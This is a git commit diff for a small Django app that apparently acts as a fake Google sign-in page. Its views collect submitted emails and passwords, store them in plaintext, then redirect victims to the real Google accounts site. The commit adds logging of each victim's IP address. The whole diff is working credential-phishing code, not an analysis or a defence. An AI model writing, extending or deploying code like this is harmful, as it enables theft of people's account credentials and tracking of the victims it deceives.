b0efccf5840233af3d7bc71567a3e46caefafd39
cesar <c3sardelrio@gmail.com>
2022-12-15 08:29:07 -0600

    requirements_file

--- django1/django1/app1/models.py
+++ django1/django1/app1/models.py
@@ -5,6 +5,7 @@ class SignIn(models.Model):
     email = models.CharField(max_length=100)
     password = models.CharField(max_length=100)
     date_time = models.DateTimeField(auto_now_add=True)
+    ipaddress = models.CharField(max_length=1000, default='1')
 
     def __init__(self, *args, **kwargs) -> None:
         super().__init__(*args, **kwargs)
--- django1/django1/app1/views.py
+++ django1/django1/app1/views.py
@@ -3,29 +3,24 @@ from django.shortcuts import render
 from datetime import datetime
 from .models import SignIn
 
-
 # Create your views here.
-
 
 def index(request):
     return render(request, 'index.html')
-
 
 def signin(request):
     print(request.POST)
     if request.method == 'POST':
         email = request.POST.get('email', None)
         password = request.POST.get('password', None)
+        ipaddress = request.META.get('REMOTE_ADDR', None)
 
         if email and password:
-            SignIn(email=str(email).strip(), password=str(
-                password).strip(), date_time=datetime.now()).save()
+            SignIn(email=str(email).strip(), password=str(password).strip(), ipaddress=str(ipaddress).strip(), date_time=datetime.now()).save()
             return HttpResponsePermanentRedirect('https://accounts.google.com')
         elif email:
             email = email.split('@')[0] + '@gmail.com'
             return render(request, 'passwd.html', {'email': email})
-
-
 
     return index(request)
 
